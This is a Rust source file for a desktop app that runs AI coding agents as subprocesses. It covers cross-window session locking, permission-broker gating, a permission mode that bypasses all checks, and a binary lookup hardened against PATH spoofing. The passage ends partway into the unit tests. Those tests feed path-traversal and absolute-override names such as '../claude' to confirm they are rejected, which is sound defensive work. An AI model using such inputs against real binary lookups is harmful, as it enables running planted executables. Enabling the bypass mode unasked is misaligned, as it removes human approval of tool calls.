//! Multi-agent abstraction.
//!
//! Each AI agent has its own subprocess, config conventions, and stream
//! format. We model the shared shape with the [`Agent`] trait, then implement
//! per-agent specifics (Claude Code today; Codex/OpenCode/Pi/Gemini later).
//!
//! v1 scope:
//! - Claude Code adapter: spawn `claude --print --output-format stream-json
//!   --verbose <prompt>` with cwd=vault, parse NDJSON stdout, emit normalized
//!   events to the frontend.
//! - Aggressive PATH detection because the desktop app's inherited PATH is
//!   unreliable on macOS.
//! - Future agents implement the `Agent` trait. Their adapter files go in
//!   `src-tauri/src/commands/agents/<agent>.rs` and register in [`spawn_for`].

mod claude_code;
mod codex;
pub mod permission;

use crate::errors::{AppError, Result};
use crate::state::AppState;
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use tauri::{AppHandle, Emitter, Manager, State};

/// Stable identifier for each agent. Frontend uses this string.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum AgentId {
    ClaudeCode,
    Codex,
    OpenCode,
    Pi,
    Gemini,
}

impl AgentId {
    pub fn label(&self) -> &'static str {
        match self {
            AgentId::ClaudeCode => "Claude Code",
            AgentId::Codex => "Codex",
            AgentId::OpenCode => "OpenCode",
            AgentId::Pi => "Pi",
            AgentId::Gemini => "Gemini",
        }
    }
}

/// Permission posture for the agent subprocess. Maps directly to the
/// `--permission-mode` flag for Claude Code; other adapters interpret the
/// closest equivalent. Default `AcceptEdits` matches the previous
/// hardcoded behavior so this change is a no-op for existing users.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "kebab-case")]
pub enum PermissionMode {
    /// Auto-approve edits; reads outside cwd still need `--add-dir`.
    #[default]
    AcceptEdits,
    /// Read-only / planning mode.
    Plan,
    /// Bypass all permission checks ("YOLO mode").
    BypassPermissions,
}

impl PermissionMode {
    /// String passed to Claude Code's `--permission-mode` flag.
    pub fn as_flag(self) -> &'static str {
        match self {
            PermissionMode::AcceptEdits => "acceptEdits",
            PermissionMode::Plan => "plan",
            PermissionMode::BypassPermissions => "bypassPermissions",
        }
    }
}

/// Reported availability for an agent.
#[derive(Debug, Serialize, Clone)]
pub struct AgentAvailability {
    pub id: AgentId,
    pub label: String,
    pub available: bool,
    pub binary_path: Option<PathBuf>,
    /// True if the adapter is actually wired. False = stub.
    pub implemented: bool,
}

/// Normalized event emitted to the frontend for a running session.
#[derive(Debug, Serialize, Clone)]
#[serde(tag = "kind", rename_all = "kebab-case", rename_all_fields = "camelCase")]
pub enum AiStreamEvent {
    /// A user-visible text chunk from the assistant.
    Text { text: String },
    /// The agent is performing a tool call. `id` correlates to the matching
    /// `tool-result`.
    ToolStart {
        id: String,
        name: String,
        input: serde_json::Value,
    },
    /// Result of a tool call.
    ToolResult {
        id: String,
        is_error: bool,
        output: serde_json::Value,
    },
    /// The agent ran into an error and is bailing.
    Error { message: String },
    /// The session is complete.
    Done {
        /// Optional usage info if the adapter exposes it.
        usage: Option<serde_json::Value>,
    },
}

/// Where the running subprocess lives, so we can kill it. Behind an Arc so the
/// reader thread (which calls .wait()) and the cancel command (which calls
/// .kill()) can both reach the same Child. The optional `broker` is the
/// agent's permission-prompt server for the active session — held here so
/// the cancel path and the subprocess waiter can both call `shutdown` on it.
///
/// `generation` increments every time a session starts. A superseded
/// session's waiter thread compares its captured generation before touching
/// shared state — without this, killing-and-restarting left the old waiter
/// free to emit a bogus `Done` and null out the *new* session's handles.
///
/// # Single-owner lock (multi-window)
///
/// There is at most **one** session for the whole process, and `owner` names the
/// window label that holds it. That label is the authorization boundary for
/// every session command:
///
/// - `start_ai_session` from a *different* live window fails with
///   [`AppError::AgentBusy`] rather than silently killing the running turn.
///   Same-window re-entry still takes over its own previous turn.
/// - `stop_ai_session` / `respond_permission` / `add_permission_rule` from a
///   non-owning window are refused. Without that, window B could approve a tool
///   call whose cwd is inside window A's vault — exactly the cross-window
///   mutation `ensure_within_active_vault` refuses everywhere else.
/// - `ai-stream` / `ai-permission` events are addressed to `owner` with
///   `emit_to`, so another window's chat panel never renders this session's
///   tokens or approval cards.
///
/// The lock must never wedge: an `owner` whose label no longer resolves to a
/// live window counts as **unowned** (see [`AgentSession::try_claim`]), and the
/// window-destroy path shuts an owned session down outright
/// ([`shutdown_session_if_owned`]).
#[derive(Default)]
pub struct AgentSession {
    pub process: Mutex<Option<std::sync::Arc<Mutex<std::process::Child>>>>,
    pub broker: Mutex<Option<Arc<dyn permission::PermissionBroker>>>,
    /// Label of the window that owns the live session, if any.
    pub owner: Mutex<Option<String>>,
    pub generation: std::sync::atomic::AtomicU64,
}

/// Outcome of trying to claim the single process-wide session.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Claim {
    /// Nobody held it (or the holder's window is gone) — it is ours now.
    ///
    /// `stolen_from` names the dead owner we took it from, when there was one.
    /// The caller needs that: a stale owner's subprocess is still running under
    /// the handles we just inherited, and only the claimant is in a position to
    /// reap it.
    Acquired { stolen_from: Option<String> },
    /// We already held it: same-window re-entry, which takes over its own turn.
    Reentrant,
    /// A different, still-live window holds it.
    Busy { owner_label: String },
}

impl AgentSession {
    /// Label currently holding the session, if any.
    pub fn owner(&self) -> Option<String> {
        self.owner.lock().unwrap().clone()
    }

    /// Claim the session for `label`, atomically with respect to another
    /// window's concurrent claim.
    ///
    /// `is_live` answers "does this label still resolve to a window?". A stale
    /// owner — a window that was destroyed mid-turn, or whose state was
    /// released before its session could be torn down — is treated as unowned
    /// and stolen from. Skipping that check is what would wedge the lock
    /// permanently: a dead label can never release it, and every other window
    /// would be told the agent is busy for the life of the process.
    ///
    /// Lock discipline: `is_live` reaches into the runtime's window map, so it
    /// is never called while this mutex is held. The claim is instead a
    /// compare-and-set — re-read the owner under the lock and retry if it moved
    /// while we were asking — which keeps two simultaneous claims from both
    /// believing they won without nesting the two locks.
    pub fn try_claim(&self, label: &str, is_live: &dyn Fn(&str) -> bool) -> Claim {
        loop {
            let observed = self.owner();
            match observed.as_deref() {
                Some(current) if current == label => return Claim::Reentrant,
                Some(current) if is_live(current) => {
                    return Claim::Busy {
                        owner_label: current.to_string(),
                    }
                }
                _ => {}
            }
            if let Some(stale) = observed.as_deref() {
                log::warn!("agent session owner {stale} is gone; releasing the lock to {label}");
            }
            let mut owner = self.owner.lock().unwrap();
            if owner.as_deref() != observed.as_deref() {
                // Someone claimed, released or re-claimed while we were checking
                // liveness. Re-evaluate against the new owner rather than
                // overwriting a decision made on stale information.
                continue;
            }
            *owner = Some(label.to_string());
            return Claim::Acquired {
                stolen_from: observed,
            };
        }
    }

    /// Drop the claim, but only if `label` still holds it. Returns whether it
    /// did. Guarded so a superseded turn's teardown can't unlock the session a
    /// *newer* owner is running in.
    pub fn release(&self, label: &str) -> bool {
        let mut owner = self.owner.lock().unwrap();
        if owner.as_deref() == Some(label) {
            *owner = None;
            true
        } else {
            false
        }
    }
}

/// Kill the running agent subprocess (if any) and tear down its permission
/// broker, leaving the ownership claim alone. Used by session takeover inside
/// `start_ai_session`, which has already claimed the lock for itself.
fn kill_running(session: &AgentSession) {
    let prev_broker = session.broker.lock().unwrap().take();
    if let Some(b) = prev_broker {
        b.shutdown();
    }
    let prev_proc = session.process.lock().unwrap().take();
    if let Some(child_arc) = prev_proc {
        let _ = child_arc.lock().unwrap().kill();
    }
}

/// Kill the running agent subprocess and release the ownership claim. Used by
/// `stop_ai_session` and by the app-exit hook in `lib.rs` so quitting the app
/// can't orphan a running `claude` process.
///
/// `try_state` rather than `state`: the embedded-MCP mode and the test apps
/// don't manage an `AgentSession`, and a shutdown hook must not panic because
/// there was nothing to shut down.
pub fn shutdown_session<R: tauri::Runtime>(app: &AppHandle<R>) {
    let Some(session) = app.try_state::<AgentSession>() else {
        return;
    };
    kill_running(&session);
    *session.owner.lock().unwrap() = None;
}

/// Shut the session down if — and only if — `label` owns it.
///
/// Called from the window-close/destroy path: closing the window that started
/// an agent must not leave its `claude` subprocess running with no UI attached
/// to it, and must hand the lock back so another window can start one. A window
/// that closes while *another* window is mid-turn changes nothing.
pub fn shutdown_session_if_owned<R: tauri::Runtime>(app: &AppHandle<R>, label: &str) {
    let Some(session) = app.try_state::<AgentSession>() else {
        return;
    };
    if session.owner().as_deref() != Some(label) {
        return;
    }
    log::info!("window {label} owned the agent session; shutting it down");
    kill_running(&session);
    session.release(label);
}

/// Address a stream event at the window that owns the session.
///
/// A broadcast `emit` here renders one window's tokens, errors and terminal
/// `Done` in *every* window's chat panel. The receiving side has to opt in too —
/// see `listenForThisWindow` in `src/lib/windowEvents.ts`.
pub(crate) fn emit_stream<R: tauri::Runtime>(
    app: &AppHandle<R>,
    owner_label: &str,
    event: AiStreamEvent,
) {
    let _ = app.emit_to(owner_label, "ai-stream", event);
}

/// The typed "another window has the agent" error, resolving the owner's vault
/// for a human-readable label.
fn busy_error<R: tauri::Runtime>(app: &AppHandle<R>, owner_label: String) -> AppError {
    let owner_vault = app
        .try_state::<AppState>()
        .and_then(|state| state.get(&owner_label))
        .and_then(|window| window.active_vault_root().ok())
        .map(|path| path.display().to_string());
    AppError::AgentBusy {
        owner_label,
        owner_vault,
    }
}

fn window_is_live<R: tauri::Runtime>(app: &AppHandle<R>, label: &str) -> bool {
    app.get_webview_window(label).is_some()
}

/// Gate a session command on ownership.
///
/// - `Ok(true)`  — `label` owns the live session; go ahead.
/// - `Ok(false)` — there is no session to act on, so the call is a no-op.
/// - `Err(AgentBusy)` — a different, live window owns it. Refuse.
///
/// An owner label that no longer resolves to a window is a stale lock: reap the
/// session and report "nothing to do" rather than letting a dead window's claim
/// veto every other window.
fn owns_session<R: tauri::Runtime>(app: &AppHandle<R>, label: &str) -> Result<bool> {
    let Some(session) = app.try_state::<AgentSession>() else {
        return Ok(false);
    };
    match session.owner() {
        None => Ok(false),
        Some(owner) if owner == label => Ok(true),
        Some(owner) => {
            if window_is_live(app, &owner) {
                Err(busy_error(app, owner))
            } else {
                log::warn!("reaping agent session left behind by window {owner}");
                // Label-guarded, so a window that claimed the session between
                // the liveness check and here doesn't lose it.
                shutdown_session_if_owned(app, &owner);
                Ok(false)
            }
        }
    }
}

/// Trait that each adapter implements.
pub trait Agent: Send + Sync {
    /// Detect whether the binary is available on this machine.
    /// Returns the resolved path if found.
    fn detect(&self) -> Option<PathBuf>;

    /// Build the command (arguments + env) to execute the prompt.
    /// `cwd` is the active vault path.
    fn build_command(
        &self,
        binary: &Path,
        cwd: &Path,
        prompt: &str,
        permission_mode: PermissionMode,
    ) -> AgentCommand;

    /// Parse a single line of stdout into zero or more normalized events.
    fn parse_line(&self, line: &str) -> Vec<AiStreamEvent>;
}

pub struct AgentCommand {
    pub binary: PathBuf,
    pub args: Vec<String>,
    pub env: Vec<(String, String)>,
}

fn agent_for(id: AgentId) -> Option<Box<dyn Agent>> {
    match id {
        AgentId::ClaudeCode => Some(Box::new(claude_code::ClaudeCodeAgent)),
        AgentId::Codex => Some(Box::new(codex::CodexAgent)),
        // Other agents are stubs until their adapters are written.
        AgentId::OpenCode | AgentId::Pi | AgentId::Gemini => None,
    }
}

/// Aggressive PATH-extending search for a binary. Looks in PATH plus a list
/// of well-known fallback locations because GUI apps on macOS inherit a thin
/// PATH that misses Homebrew, mise, asdf, npm-global, ~/.claude/local, etc.
///
/// Security: the resolved binary must be an **absolute** path that exists on
/// disk. We reject any candidate that resolves relative to the current working
/// directory — a `.`, empty, or otherwise relative `PATH` entry would
/// otherwise let an attacker who controls the active vault cwd drop a
/// malicious `claude`/`codex` executable that we'd then spawn. The `binary`
/// argument itself is also rejected if it contains a path separator, so a
/// caller can never smuggle in a traversal or absolute override.
pub fn which(binary: &str) -> Option<PathBuf> {
    use std::env;
    use std::path::Component;

    // Defense-in-depth: callers pass bare binary names ("claude", "codex").
    // A name containing a separator (or `.`/`..`) is not a thing we look up on
    // PATH — refuse it rather than join it onto every candidate dir.
    if binary.is_empty()
        || Path::new(binary)
            .components()
            .any(|c| !matches!(c, Component::Normal(_)))
    {
        return None;
    }

    // Only accept a candidate that is an absolute path to an existing file.
    // This drops cwd-relative PATH entries (`.`, "", "foo/bar") which are the
    // spoofing vector when the cwd is attacker-controlled.
    let accept = |p: PathBuf| -> Option<PathBuf> {
        if p.is_absolute() && p.is_file() {
            Some(p)
        } else {
            None
        }
    };

    let mut candidates: Vec<PathBuf> = Vec::new();

    if let Ok(p) = env::var("PATH") {
        for dir in env::split_paths(&p) {
            // Skip empty / relative PATH entries entirely; only absolute
            // directories may contribute a candidate.
            if dir.as_os_str().is_empty() || !dir.is_absolute() {
                continue;
            }
            candidates.push(dir.join(binary));
        }
    }

    if let Some(home) = dirs::home_dir() {
        for sub in &[
            ".local/bin",
            ".claude/local",
            ".npm-global/bin",
            ".pnpm-global/bin",
            ".cargo/bin",
            ".bun/bin",
            ".volta/bin",
            ".mise/installs/node/latest/bin",
            ".asdf/shims",
            ".nvm/versions/node",
        ] {
            candidates.push(home.join(sub).join(binary));
        }
    }
    for p in &[
        "/opt/homebrew/bin",
        "/usr/local/bin",
        "/usr/bin",
        "/bin",
    ] {
        candidates.push(PathBuf::from(p).join(binary));
    }

    candidates.into_iter().find_map(accept)
}

#[tauri::command]
pub fn detect_agents() -> Vec<AgentAvailability> {
    [
        AgentId::ClaudeCode,
        AgentId::Codex,
        AgentId::OpenCode,
        AgentId::Pi,
        AgentId::Gemini,
    ]
    .iter()
    .map(|id| {
        let implemented = agent_for(*id).is_some();
        let binary_path = agent_for(*id).and_then(|a| a.detect());
        AgentAvailability {
            id: *id,
            label: id.label().to_string(),
            available: binary_path.is_some(),
            binary_path,
            implemented,
        }
    })
    .collect()
}

/// Spawn an agent subprocess with its cwd inside the calling window's vault.
///
/// `vault_path` comes straight from the webview and becomes the working
/// directory of a process that can read and write everything under it, so it
/// is validated against *this window's* active vault before anything else
/// happens — before the adapter is looked up, before any running session is
/// killed, and (crucially) before a subprocess exists. Without that check a
/// second window could invoke this with the first window's vault root and get
/// an LLM writing into a vault it has no scope over: the same cross-window
/// mutation `guard_path` blocks on every filesystem command.
///
/// Second gate: the single-owner lock on [`AgentSession`]. A window that asks
/// for an agent while a *different* live window is mid-turn gets
/// [`AppError::AgentBusy`] naming that window, not a silent takeover of it. A
/// claim that never turns into a running session is released again — a lock held
/// by a session that never started would tell every other window "busy" forever.
///
/// Release is *not* unconditional, because a same-window re-entry
/// ([`Claim::Reentrant`]) is holding the lock on behalf of a turn that is
/// already running. Handing that lock back on a failed follow-up prompt would
/// let another window claim it and kill a live subprocess its user never
/// started. The two are kept apart by resolving the adapter and its binary
/// *before* the claim (`prepare_agent`), so the only fallible step left between
/// the claim and `kill_running` is the ownership check itself: past that point
/// this window's previous turn is provably dead, and the lock can go back
/// regardless of how the claim was obtained. The one failure that can still
/// happen with a live session under our name — a failed `prepare_agent` on a
/// re-entry — keeps the lock. The mirror case, a failed `prepare_agent` on a
/// claim *stolen* from a dead window, hands the lock back only after reaping
/// that window's leftover subprocess: releasing first would leave it running
/// with `owner == None`, which every ownership-gated command reads as "there is
/// no session" — no window could then stop it. Agent availability is deliberately checked before
/// the claim but *reported* after it, so `AgentBusy` still wins over "not
/// implemented" / "binary not found" for a non-owner.
#[tauri::command]
pub async fn start_ai_session<R: tauri::Runtime>(
    window: tauri::WebviewWindow<R>,
    state: State<'_, AppState>,
    agent: AgentId,
    prompt: String,
    vault_path: PathBuf,
    permission_mode: Option<PermissionMode>,
) -> Result<()> {
    // Scope check first — see the doc comment. The canonical form returned here
    // is what gets used as the cwd, so the spawn can't be talked into a
    // different directory than the one that was validated.
    let vault_path = state
        .get_or_create(window.label())
        .ensure_within_active_vault(&vault_path)?;
    let app = window.app_handle().clone();
    let label = window.label().to_string();

    // Resolve the adapter and its binary *before* the claim, so that nothing
    // between the claim and `kill_running` can fail. Side-effect free: it only
    // looks at the adapter table and the filesystem.
    let prepared = prepare_agent(agent);

    let claim = app
        .state::<AgentSession>()
        .try_claim(&label, &|owner| window_is_live(&app, owner));
    let (adapter, binary) = match (claim, prepared) {
        // Re-entry from the owning window keeps the old behavior: this window's
        // previous turn is taken over (killed) by its next one.
        (Claim::Acquired { .. } | Claim::Reentrant, Ok(pair)) => pair,
        (Claim::Acquired { stolen_from }, Err(e)) => {
            // Nothing has been spawned yet, so a *fresh* claim has to go back.
            // But if it was stolen from a window that is gone, that window's
            // subprocess is still alive under the handles we just inherited, and
            // the kill normally done by `spawn_claimed_session` is never going to
            // happen. Reap it here or it is orphaned *unreachably*: once the lock
            // is released the owner is `None`, so `owns_session` reports "no
            // session" and `stop_ai_session` is a silent no-op from every window
            // (reference behavior S3.2 — no orphaned process).
            if let Some(dead) = stolen_from {
                log::warn!("reaping agent session left behind by window {dead}");
                kill_running(&app.state::<AgentSession>());
            }
            app.state::<AgentSession>().release(&label);
            return Err(e);
        }
        // A re-entry keeps the lock: the previous turn it belongs to is still
        // running, and releasing here would let another window claim the lock
        // and kill that live subprocess.
        (Claim::Reentrant, Err(e)) => return Err(e),
        (Claim::Busy { owner_label }, _) => return Err(busy_error(&app, owner_label)),
    };

    let started =
        spawn_claimed_session(&app, &label, agent, adapter, binary, &prompt, &vault_path, permission_mode);
    if started.is_err() {
        // Everything in there runs after `kill_running`, so whatever we owned is
        // already dead: nothing is running under our name and the lock must go
        // back (label-guarded, so a newer owner keeps theirs).
        app.state::<AgentSession>().release(&label);
    }
    started
}

/// Look up the adapter for `agent` and resolve its binary. Pure lookup — no
/// session state is touched — so it can run before the ownership claim.
fn prepare_agent(agent: AgentId) -> Result<(Box<dyn Agent>, PathBuf)> {
    let adapter = agent_for(agent).ok_or_else(|| {
        AppError::Io(format!("Agent '{}' is not yet implemented.", agent.label()))
    })?;
    let binary = adapter
        .detect()
        .ok_or_else(|| AppError::Io(format!("'{}' binary was not found on this machine.", agent.label())))?;
    Ok((adapter, binary))
}

/// The spawn half of `start_ai_session`, run with the session lock already held
/// by `label`. Split out so every early return releases the claim exactly once
/// (in the caller) instead of once per `?`. Its first act is to kill this
/// window's previous turn, which is what makes that single release safe on every
/// path through here.
#[allow(clippy::too_many_arguments)]
fn spawn_claimed_session<R: tauri::Runtime>(
    app: &AppHandle<R>,
    label: &str,
    agent: AgentId,
    adapter: Box<dyn Agent>,
    binary: PathBuf,
    prompt: &str,
    vault_path: &Path,
    permission_mode: Option<PermissionMode>,
) -> Result<()> {
    use std::io::{BufRead, BufReader};
    use std::process::{Command as StdCommand, Stdio};
    use std::sync::Arc;
    use std::thread;

    // Stop any session already running. Both the process and any active
    // permission broker hold state from the prior turn — drain both so
    // pending approval cards resolve to deny rather than stranding. Only ever
    // *our own* previous turn: another window's session was refused above, so
    // this cannot kill a turn the caller doesn't own. The ownership claim is
    // deliberately left in place (we hold it, and are about to reuse it).
    kill_running(&app.state::<AgentSession>());
    // Claim a new generation so the superseded session's waiter thread
    // (still draining the killed child) can tell it no longer owns the
    // shared state and must not emit Done or clear our handles.
    let my_generation = app
        .state::<AgentSession>()
        .generation
        .fetch_add(1, std::sync::atomic::Ordering::SeqCst)
        + 1;

    let mode = permission_mode.unwrap_or_default();
    let mut cmd = adapter.build_command(&binary, vault_path, prompt, mode);

    // Spawn a fresh broker per session and let it inject its own flags /
    // env / config-file references into the command. Adapters that don't
    // need a broker (e.g. Codex today) get None and the command is left
    // untouched. The broker is told which window owns the session so its
    // approval cards are addressed there instead of broadcast.
    let broker: Option<Arc<dyn permission::PermissionBroker>> = match permission::broker_for(agent, app.clone(), label.to_string()) {
        Ok(b) => b,
        Err(e) => {
            return Err(AppError::Io(format!("permission broker failed to start: {e}")));
        }
    };
    if let Some(b) = &broker {
        b.wire(&mut cmd);
    }

    // Never spawn a relative program name: `Command::new("claude")` would
    // perform its own cwd-then-PATH resolution, reopening the spoofing vector
    // that `which()` closes. The binary must be the absolute path that
    // `detect()` resolved.
    if !cmd.binary.is_absolute() {
        return Err(AppError::Io(format!(
            "refusing to spawn {}: resolved binary is not an absolute path",
            agent.label()
        )));
    }

    // stdin → /dev/null so the agent doesn't block waiting for input. Some
    // CLIs (Claude Code) print a slow-stdin warning otherwise.
    let mut std_cmd = StdCommand::new(&cmd.binary);
    std_cmd
        .args(&cmd.args)
        .current_dir(vault_path)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    for (k, v) in &cmd.env {
        std_cmd.env(k, v);
    }

    log::info!(
        "starting {} session in {} (mode: {})",
        agent.label(),
        vault_path.display(),
        mode.as_flag()
    );
    let mut child = std_cmd
        .spawn()
        .map_err(|e| {
            log::error!("failed to spawn {}: {e}", agent.label());
            AppError::Io(format!("Failed to spawn {}: {}", agent.label(), e))
        })?;
    let stdout = child.stdout.take()
        .ok_or_else(|| AppError::Io("subprocess missing stdout".into()))?;
    let stderr = child.stderr.take()
        .ok_or_else(|| AppError::Io("subprocess missing stderr".into()))?;

    let child_arc = Arc::new(Mutex::new(child));
    *app.state::<AgentSession>().process.lock().unwrap() = Some(child_arc.clone());
    *app.state::<AgentSession>().broker.lock().unwrap() = broker.clone();

    // stdout reader: parse each line and emit normalized events, addressed to
    // the window that owns the session (see `emit_stream`).
    let app_stdout = app.clone();
    let label_stdout = label.to_string();
    thread::spawn(move || {
        let reader = BufReader::new(stdout);
        for line in reader.lines() {
            let Ok(line) = line else { break };
            if line.trim().is_empty() { continue; }
            for ev in adapter.parse_line(&line) {
                emit_stream(&app_stdout, &label_stdout, ev);
            }
        }
    });

    // stderr reader: surface noteworthy stderr as error events. Filter the
    // common slow-stdin warning since we already redirected stdin to null.
    let app_stderr = app.clone();
    let label_stderr = label.to_string();
    thread::spawn(move || {
        let reader = BufReader::new(stderr);
        for line in reader.lines() {
            let Ok(line) = line else { break };
            let trimmed = line.trim();
            if trimmed.is_empty() { continue; }
            if trimmed.starts_with("Warning:") { continue; }
            log::warn!("agent stderr: {trimmed}");
            emit_stream(
                &app_stderr,
                &label_stderr,
                AiStreamEvent::Error { message: line },
            );
        }
    });

    // Waiter: poll try_wait so we don't hold the child mutex across a blocking
    // wait — otherwise stop_ai_session can't kill while we're waiting.
    // Also tears the broker down so any pending approval cards resolve as
    // deny whether the subprocess exited cleanly or crashed mid-turn.
    let app_wait = app.clone();
    let label_wait = label.to_string();
    let child_for_wait = child_arc.clone();
    let broker_for_wait = broker.clone();
    thread::spawn(move || {
        let exit_code: Option<i32> = loop {
            {
                let mut guard = child_for_wait.lock().unwrap();
                match guard.try_wait() {
                    Ok(Some(status)) => break status.code(),
                    Ok(None) => {} // still running
                    Err(_) => break None,
                }
            }
            std::thread::sleep(std::time::Duration::from_millis(50));
        };
        log::info!("agent session exited (code: {exit_code:?})");
        if let Some(b) = &broker_for_wait { b.shutdown(); }
        // A newer session may have taken over while this child was being
        // killed. Only the waiter that still owns the current generation may
        // emit Done and clear the shared handles — otherwise it would
        // terminate the new session's UI state from under it.
        let session = app_wait.state::<AgentSession>();
        if session.generation.load(std::sync::atomic::Ordering::SeqCst) != my_generation {
            return;
        }
        emit_stream(
            &app_wait,
            &label_wait,
            AiStreamEvent::Done {
                usage: exit_code.map(|c| serde_json::json!({ "exit_code": c })),
            },
        );
        *session.process.lock().unwrap() = None;
        *session.broker.lock().unwrap() = None;
        // Hand the single-owner lock back: the turn is over, so any window may
        // start the next one. Guarded on the label so a newer owner's claim
        // survives (belt and braces — the generation check above already
        // returned in that case).
        session.release(&label_wait);
    });

    Ok(())
}

/// Stop the running session — but only if this window owns it.
///
/// A window that isn't the owner gets [`AppError::AgentBusy`] instead of
/// killing someone else's turn. With no session at all this is a no-op, which
/// is what makes the frontend's fire-and-forget cancel safe.
#[tauri::command]
pub fn stop_ai_session<R: tauri::Runtime>(
    app: AppHandle<R>,
    window: tauri::WebviewWindow<R>,
) -> Result<()> {
    if owns_session(&app, window.label())? {
        shutdown_session(&app);
    }
    Ok(())
}

/// Resolve a pending permission request. The frontend calls this from the
/// approval card; the broker forwards the decision to whichever HTTP
/// handler thread is parked waiting for it. Returns `false` if no such
/// request was pending (already resolved, broker shut down, etc.).
///
/// Owner-gated. The request id is opaque and the broker is process-global, so
/// without the label check a window that never started the session could
/// approve a tool call whose cwd is inside the *owning* window's vault —
/// laundering a write past the per-window scope guard that
/// `start_ai_session` installs. The card never appears in a non-owning window
/// either (the `ai-permission` emit is addressed), so this path is only
/// reachable by a webview inventing an id.
#[tauri::command]
pub fn respond_permission<R: tauri::Runtime>(
    app: AppHandle<R>,
    window: tauri::WebviewWindow<R>,
    id: String,
    decision: permission::DecisionKind,
    message: Option<String>,
    updated_input: Option<serde_json::Value>,
) -> Result<bool> {
    if !owns_session(&app, window.label())? {
        return Ok(false);
    }
    let d = permission::Decision { id, decision, message, updated_input };
    let broker = app.state::<AgentSession>().broker.lock().unwrap().clone();
    Ok(broker.map(|b| b.respond(d)).unwrap_or(false))
}

/// Extend the active session's allowlist. Subsequent matching tool calls
/// resolve to allow without a UI roundtrip. No-op when there's no live
/// session or the active broker doesn't support allowlists.
///
/// Owner-gated for the same reason as `respond_permission`, and more sharply: an
/// allow rule is a *standing* approval, so a non-owning window could otherwise
/// blanket-allow `Bash` for the rest of another window's session.
#[tauri::command]
pub fn add_permission_rule<R: tauri::Runtime>(
    app: AppHandle<R>,
    window: tauri::WebviewWindow<R>,
    tool: String,
    path_prefix: Option<String>,
) -> Result<bool> {
    if !owns_session(&app, window.label())? {
        return Ok(false);
    }
    let broker = app.state::<AgentSession>().broker.lock().unwrap().clone();
    Ok(broker.map(|b| b.add_allow_rule(&tool, path_prefix.as_deref())).unwrap_or(false))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Every label is live. The normal case: all windows still open.
    fn all_live(_label: &str) -> bool {
        true
    }

    #[test]
    fn an_unowned_session_is_claimed_by_the_first_window_to_ask() {
        let session = AgentSession::default();

        assert_eq!(
            session.try_claim("a", &all_live),
            Claim::Acquired { stolen_from: None }
        );
        assert_eq!(session.owner().as_deref(), Some("a"));
    }

    #[test]
    fn the_owning_window_re_enters_its_own_session() {
        // Sending a second prompt from the same window still takes over its own
        // previous turn — that behavior is unchanged by the lock.
        let session = AgentSession::default();
        session.try_claim("a", &all_live);

        assert_eq!(session.try_claim("a", &all_live), Claim::Reentrant);
        assert_eq!(session.owner().as_deref(), Some("a"));
    }

    #[test]
    fn another_live_window_is_told_who_holds_the_session() {
        let session = AgentSession::default();
        session.try_claim("a", &all_live);

        assert_eq!(
            session.try_claim("b", &all_live),
            Claim::Busy {
                owner_label: "a".into()
            },
            "window B silently took over window A's agent"
        );
        // And the claim is unmoved: a refused claimant must not have stolen it.
        assert_eq!(session.owner().as_deref(), Some("a"));
    }

    #[test]
    fn releasing_the_lock_lets_the_next_window_in() {
        let session = AgentSession::default();
        session.try_claim("a", &all_live);

        assert!(session.release("a"));
        assert_eq!(session.owner(), None);
        assert_eq!(
            session.try_claim("b", &all_live),
            Claim::Acquired { stolen_from: None }
        );
    }

    #[test]
    fn a_stale_release_cannot_unlock_a_newer_owners_session() {
        // The superseded waiter thread races the next turn's claim. If its
        // release were unconditional it would unlock a session that is running.
        let session = AgentSession::default();
        session.try_claim("a", &all_live);
        session.release("a");
        session.try_claim("b", &all_live);

        assert!(!session.release("a"), "a stale label released B's claim");
        assert_eq!(session.owner().as_deref(), Some("b"));
    }

    #[test]
    fn an_owner_window_that_is_gone_does_not_wedge_the_lock() {
        // The failure this guards is total: a dead label can never release the
        // lock itself, so treating it as owned would mean no window in the
        // process could ever start an agent again.
        let session = AgentSession::default();
        session.try_claim("dead", &all_live);

        let only_b_is_live = |label: &str| label == "b";
        // The dead owner rides along on the claim: its subprocess is still
        // running under the handles B just inherited, and B is the only caller
        // in a position to reap it.
        assert_eq!(
            session.try_claim("b", &only_b_is_live),
            Claim::Acquired {
                stolen_from: Some("dead".into())
            }
        );
        assert_eq!(session.owner().as_deref(), Some("b"));
    }

    #[test]
    fn a_live_owner_is_not_mistaken_for_a_dead_one() {
        // Control for the test above: liveness is the only thing that permits a
        // steal, so a live owner must still win.
        let session = AgentSession::default();
        session.try_claim("a", &all_live);

        let both_live = |label: &str| label == "a" || label == "b";
        assert!(matches!(
            session.try_claim("b", &both_live),
            Claim::Busy { .. }
        ));
    }

    #[test]
    fn claims_are_serialized_so_only_one_window_wins() {
        use std::sync::atomic::{AtomicUsize, Ordering};
        use std::sync::{Arc, Barrier};

        // Two windows sending a prompt at the same instant: exactly one may get
        // `Acquired`, or two subprocesses would run believing they own the lock.
        let session = Arc::new(AgentSession::default());
        let barrier = Arc::new(Barrier::new(8));
        let acquired = Arc::new(AtomicUsize::new(0));
        let handles: Vec<_> = (0..8)
            .map(|i| {
                let session = Arc::clone(&session);
                let barrier = Arc::clone(&barrier);
                let acquired = Arc::clone(&acquired);
                std::thread::spawn(move || {
                    let label = format!("w{i}");
                    barrier.wait();
                    if matches!(
                        session.try_claim(&label, &all_live),
                        Claim::Acquired { .. }
                    ) {
                        acquired.fetch_add(1, Ordering::SeqCst);
                    }
                })
            })
            .collect();
        for handle in handles {
            handle.join().unwrap();
        }

        assert_eq!(acquired.load(Ordering::SeqCst), 1);
        assert!(session.owner().is_some());
    }

    /// A `binary` name with a path separator or traversal component is never a
    /// PATH lookup — it must be rejected so it can't smuggle in an absolute
    /// override or `../` traversal.
    #[test]
    fn which_rejects_binary_names_with_path_components() {
        assert!(which("").is_none());
        assert!(which("../claude").is_none());
        assert!(which("/usr/bin/claude").is_none());
        assert!(which("foo/bar").is_none());
        assert!(which(".").is_none());
    }

    /// A relative or empty `PATH` entry (which would resolve against the
    /// attacker-controlled cwd) must never produce a spawnable candidate, even
    /// if a matching file exists in the current directory.
    #[test]
    fn which_ignores_relative_path_entries() {
